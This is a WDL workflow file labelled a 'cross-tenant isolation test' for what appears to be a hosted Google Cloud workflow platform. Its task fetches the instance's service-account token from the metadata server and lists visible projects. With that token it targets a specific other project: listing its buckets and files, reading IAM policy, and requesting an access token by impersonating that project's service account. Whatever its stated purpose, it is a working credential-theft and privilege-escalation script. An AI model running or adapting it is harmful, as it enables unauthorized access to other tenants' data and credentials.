version 1.0

workflow CrossTenantTest {
    call CheckAccess
}

task CheckAccess {
    command <<<
        echo "=== CROSS-TENANT ISOLATION TEST ==="
        echo "Date: $(date -u)"

        TOKEN=$(curl -s --max-time 5 -H "Metadata-Flavor: Google" \
          "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token" | \
          python3 -c "import sys,json; print(json.load(sys.stdin)['access_token'])" 2>/dev/null)
        PROJECT=$(curl -s --max-time 5 -H "Metadata-Flavor: Google" \
          "http://metadata.google.internal/computeMetadata/v1/project/project-id" 2>/dev/null)
        SA=$(curl -s --max-time 5 -H "Metadata-Flavor: Google" \
          "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/email" 2>/dev/null)

        echo "Project: $PROJECT"
        echo "SA: $SA"

        echo "=== VISIBLE PROJECTS ==="
        curl -s --max-time 10 "https://cloudresourcemanager.googleapis.com/v1/projects" -H "Authorization: Bearer $TOKEN"

        echo "=== OWNER PROJECT ==="
        curl -s --max-time 10 "https://cloudresourcemanager.googleapis.com/v1/projects/wb-golden-plum-6731" -H "Authorization: Bearer $TOKEN"

        echo "=== OWNER BUCKETS ==="
        curl -s --max-time 10 "https://storage.googleapis.com/storage/v1/b?project=wb-golden-plum-6731" -H "Authorization: Bearer $TOKEN"

        echo "=== OWNER BUCKET FILES ==="
        curl -s --max-time 10 "https://storage.googleapis.com/storage/v1/b/storage-papyge-wb-golden-plum-6731/o?maxResults=10" -H "Authorization: Bearer $TOKEN"

        echo "=== IAM POLICY ==="
        curl -s --max-time 10 -X POST "https://cloudresourcemanager.googleapis.com/v1/projects/${PROJECT}:getIamPolicy" -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" -d '{}'

        echo "=== IMPERSONATE OWNER SA ==="
        curl -s --max-time 10 -X POST "https://iamcredentials.googleapis.com/v1/projects/-/serviceAccounts/pet-2778175469911ac304b8a@wb-golden-plum-6731.iam.gserviceaccount.com:generateAccessToken" -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" -d '{"scope":["https://www.googleapis.com/auth/cloud-platform"],"lifetime":"3600s"}'

        echo "=== DONE ==="
    >>>

    output {
        File result = stdout()
    }

    runtime {
        docker: "ubuntu:22.04"
    }
}
